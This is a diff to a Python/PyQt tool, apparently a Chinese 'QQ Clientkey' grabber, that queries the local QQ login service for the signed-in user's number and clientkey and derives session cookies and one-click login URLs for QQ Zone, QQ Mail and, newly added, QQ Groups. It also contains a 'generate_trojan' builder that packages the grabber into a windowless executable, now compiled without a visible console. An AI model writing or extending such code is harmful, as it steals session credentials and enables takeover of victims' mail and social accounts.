@@ -9,6 +9,7 @@ from threading import Thread
 from webbrowser import open as web_open
 import hashlib
 import os
+import subprocess
 import zipfile
 from time import sleep
 import sys
@@ -33,18 +34,22 @@ class EmittingStream(QtCore.QObject):
     def flush(self):
         pass
 
-
 class Ui_Dialog(object):
     def setupUi(self, Dialog):
         self.func_running = False
+        self.qzone_url = ''
+        self.qun_url = ''
+        self.mail_url = ''
         Dialog.setObjectName("Dialog")
-        Dialog.resize(560, 463)
+        Dialog.resize(701, 463)
         font = QtGui.QFont()
         font.setFamily("微软雅黑")
         Dialog.setFont(font)
         Dialog.setWindowFlags(QtCore.Qt.WindowMinimizeButtonHint | QtCore.Qt.WindowCloseButtonHint)
         Dialog.setFixedSize(Dialog.width(), Dialog.height())
         Dialog.setWindowIcon(QtGui.QIcon("./icon.ico"))
+        self.centralwidget = QtWidgets.QWidget(Dialog)
+        self.centralwidget.setObjectName("centralwidget")
         self.label = QtWidgets.QLabel(Dialog)
         self.label.setGeometry(QtCore.QRect(20, 10, 131, 21))
         font = QtGui.QFont()
@@ -111,7 +116,7 @@ class Ui_Dialog(object):
         self.label_5.setLayoutDirection(QtCore.Qt.LeftToRight)
         self.label_5.setObjectName("label_5")
         self.textEdit = QtWidgets.QTextEdit(Dialog)
-        self.textEdit.setGeometry(QtCore.QRect(10, 230, 541, 221))
+        self.textEdit.setGeometry(QtCore.QRect(10, 230, 682, 221))
         self.textEdit.setReadOnly(True)
         self.textEdit.setObjectName("textEdit")
         self.textEdit.textChanged.connect(lambda: self.textEdit.moveCursor(11))
@@ -185,11 +190,23 @@ class Ui_Dialog(object):
         self.lineEdit_9.setGeometry(QtCore.QRect(410, 145, 131, 20))
         self.lineEdit_9.setObjectName("lineEdit_9")
         self.label_13 = QtWidgets.QLabel(Dialog)
-        self.label_13.setGeometry(QtCore.QRect(300, 210, 301, 16))
+        self.label_13.setGeometry(QtCore.QRect(300, 210, 450, 16))
         self.label_13.setObjectName("label_13")
         self.label_14 = QtWidgets.QLabel(Dialog)
         self.label_14.setGeometry(QtCore.QRect(290, 0, 16, 221))
         self.label_14.setObjectName("label_14")
+        self.pushButton_3 = QtWidgets.QPushButton(Dialog)
+        self.pushButton_3.setGeometry(QtCore.QRect(550, 45, 141, 41))
+        self.pushButton_3.setObjectName("pushButton_3")
+        self.pushButton_3.clicked.connect(lambda :web_open(self.qzone_url))
+        self.pushButton_5 = QtWidgets.QPushButton(Dialog)
+        self.pushButton_5.setGeometry(QtCore.QRect(550, 95, 141, 41))
+        self.pushButton_5.setObjectName("pushButton_5")
+        self.pushButton_5.clicked.connect(lambda: web_open(self.mail_url))
+        self.pushButton_6 = QtWidgets.QPushButton(Dialog)
+        self.pushButton_6.setGeometry(QtCore.QRect(550, 145, 141, 41))
+        self.pushButton_6.setObjectName("pushButton_6")
+        self.pushButton_6.clicked.connect(lambda: web_open(self.qun_url))
         self.retranslateUi(Dialog)
         QtCore.QMetaObject.connectSlotsByName(Dialog)
         self.output_signal = EmittingStream()
@@ -217,15 +234,18 @@ class Ui_Dialog(object):
         self.label_8.setText(_translate("Dialog", "<html><head/><body><p>ClientKey:</p></body></html>"))
         self.label_12.setText(_translate("Dialog", "<html><head/><body><p>邮箱登录地址:</p></body></html>"))
         self.pushButton_2.setText(_translate("Dialog", "获取信息"))
-        self.label_13.setText(_translate("Dialog", "---------------------------------------------------------------"))
+        self.label_13.setText(_translate("Dialog", "------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"))
         self.label_14.setText(_translate("Dialog",
                                          "<html><head/><body><p>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/></p></body></html>"))
-
+        self.pushButton_3.setText(_translate("Dialog", "QQ空间"))
+        self.pushButton_5.setText(_translate("Dialog", "QQ邮箱"))
+        self.pushButton_6.setText(_translate("Dialog", "QQ群"))
     def change_textedit(self, message: str):
         self.textEdit.setText(self.textEdit.toPlainText() + message)
 
     def get_qq_info(self):
         self.func_running = True
+        os.system("title QQ Clientkey 获取器")
         print("[Info] 欢迎使用 QQ Clientkey 获取器!")
         print("[Warning] 请勿将本窗口任何信息透露给他人,否则后果自行承担!")
         print("[Tip] 在刚登录QQ时获取可能会出现如无法获取skey的情况,这时请重启工具获取!")
@@ -255,8 +275,17 @@ class Ui_Dialog(object):
             get_uin = session.get("https://localhost.ptlogin2.qq.com:4301/pt_get_uins", params=params, cookies=cookies,
                                   headers=headers).text
             uin_list = re.findall(r'\[([^\[\]]*)\]', get_uin)[0]
-            uin = json.loads(uin_list).get('uin')
-            nickname = json.loads(uin_list).get('nickname')
+            split_list = list(map(lambda i: i if i[0] == '{' else '{' + i, uin_list.split(',{')))
+            uin = None
+            nickname = None
+            if len(split_list) > 1:
+                print("[Info] 检测到您正在多开QQ,将使用第一个QQ号获取")
+                uin_list = json.loads(json.loads(json.dumps(split_list[0])))  # Json库我爱你loads后返回str还要再loads一次 凸(艹皿艹 )
+                uin = uin_list.get("uin")
+                nickname = uin_list.get("nickname")
+            else:
+                uin = json.loads(uin_list).get('uin')
+                nickname = json.loads(uin_list).get('nickname')
             print(f"[+] uin={uin}\n[+] nickname={nickname}")
             clientkey_params = {"clientuin": uin,
                                 "r": "0.14246048393632815",
@@ -287,11 +316,6 @@ class Ui_Dialog(object):
                 "ptopt": "1",
                 "style": "40",
                 "daid": "5"
-            }
-            qzone_jump_cookies = {
-                "clientkey": clientkey,
-                "clientuin": uin,
-                "pt_local_token": pt_local_token
             }
             headers = {"Referer": "https://xui.ptlogin2.qq.com/",
                        "Host": "ssl.ptlogin2.qq.com",
@@ -336,6 +360,31 @@ class Ui_Dialog(object):
             mail_url = f"https://ssl.ptlogin2.qq.com/jump?ptlang=1033&clientuin={uin}&clientkey={clientkey}&u1=https://wx.mail.qq.com/list/readtemplate?name=login_page.html&keyindex=19"
             print(f"[+] mail_pskey={mail_pskey}")
             print(f"[+] mail_url={mail_url}")
+            qun_params = {
+                "clientuin": str(uin),
+                "keyindex": "19",
+                "pt_aid": "715030901",
+                "daid": "73",
+                "u1": "https://qun.qq.com/",
+                "pt_local_tk": str(pt_local_token),
+                "pt_3rd_aid": "0",
+                "ptopt": "1",
+                "style": "40"
+            }
+            qun_cookies = {
+                "clientkey": str(clientkey),
+                "clientuin": str(uin),
+                "pt_local_token": str(pt_local_token),
+                "pt_login_sig": str(pt_login_sig)
+            }
+            qun_res = session.get("https://ssl.ptlogin2.qq.com/jump", params=qun_params, cookies=qun_cookies,
+                                  headers=headers)
+            qun_url = extractor.find_urls(qun_res.text)[0]
+            qun_cookie = requests.utils.dict_from_cookiejar(qun_res.cookies)
+            qun_info_cookies = session.get(qun_url, allow_redirects=False).cookies
+            qun_skey = qun_info_cookies.get("skey")
+            qun_pskey = qun_info_cookies.get("p_skey")
+            print(f"[+] qun_url={qun_url}")
         except Exception as e:
             print(f"[ERROR] 获取QQ空间&QQ邮箱地址时出现错误,原因:{e}")
             self.func_running = False
@@ -347,14 +396,23 @@ class Ui_Dialog(object):
         print(f"qzone_skey={qzone_skey}")
         print(f"qzone_pskey={qzone_pskey}")
         print(f"mail_pskey={mail_pskey}")
+        print(f"qun_skey={qun_skey}")
+        print(f"qun_pskey={qun_pskey}")
+
         print(f"qzone_url={qzone_url}")
+
         print(f"mail_url={mail_url}")
-        print("******************感谢使用******************",end='')
+
+        print(f"qun_url={qun_url}")
+        print("******************感谢使用******************")
         self.lineEdit_6.setText(nickname)
         self.lineEdit_5.setText(str(uin))
         self.lineEdit_7.setText(clientkey)
         self.lineEdit_8.setText(qzone_url)
         self.lineEdit_9.setText(mail_url)
+        self.qzone_url = qzone_url
+        self.qun_url = qun_url
+        self.mail_url = mail_url
         self.func_running = False
 
     def generate_trojan(self):
@@ -363,10 +421,9 @@ class Ui_Dialog(object):
             return
         sleep(1)
         print("正在验证文件完整性...")
-        # print(encrypt('Tools.zip', 'md5'))
-        if encrypt('Tools.zip', 'md5') == '1dc8bc2b6fef8a0933f15c419f9ef99e':
+        if encrypt('Tools.zip', 'md5') == 'ba44b872e7d53f5c7dfb1da1c0d114a2':
             pass
-        elif encrypt('Tools.zip', 'md5') == '65e83fcb0f3a0f6729d24a24794eefb5':
+        elif encrypt('Tools.zip', 'md5') in ['65e83fcb0f3a0f6729d24a24794eefb5','1dc8bc2b6fef8a0933f15c419f9ef99e']:
             print("失败,检测到您正在使用旧版搭建包,请删除现有搭建包重新打开工具下载新版搭建包!")
             return
         else:
@@ -415,13 +472,10 @@ sys.exit(0)
         with open(".\\qkey_code.py", 'w', encoding='utf-8') as f:
             f.write(content)
         print("开始下载打包所需文件...")
-        os.system(".\\data\\python.exe -m pip install pyinstaller -i https://pypi.tuna.tsinghua.edu.cn/simple")
-        os.system(".\\data\\python.exe -m pip install requests -i https://pypi.tuna.tsinghua.edu.cn/simple")
-        os.system(".\\data\\python.exe -m pip install urlextract -i https://pypi.tuna.tsinghua.edu.cn/simple")
-        os.system(".\\data\\python.exe -m pip install psutil -i https://pypi.tuna.tsinghua.edu.cn/simple")
+        subprocess.call(".\\data\\python.exe -m pip install pyinstaller requests urlextract psutil -i https://pypi.tuna.tsinghua.edu.cn/simple",creationflags=subprocess.CREATE_NO_WINDOW)
         print("开始打包...")
-        os.system(
-            ".\\data\\Scripts\\pyinstaller.exe -F -w --add-data .\\tlds-alpha-by-domain.txt;.\\urlextract\data qkey_code.py")
+        subprocess.call(
+            f".\\data\\Scripts\\pyinstaller.exe -F -w --add-data .\\tlds-alpha-by-domain.txt;.\\urlextract\data qkey_code.py",creationflags=subprocess.CREATE_NO_WINDOW)
         os.rename(".\\dist\\qkey_code.exe", ".\\dist\\QQKey.exe")
         with open(".\\dist\\QQKey.exe", 'rb') as f:
             a = f.read()
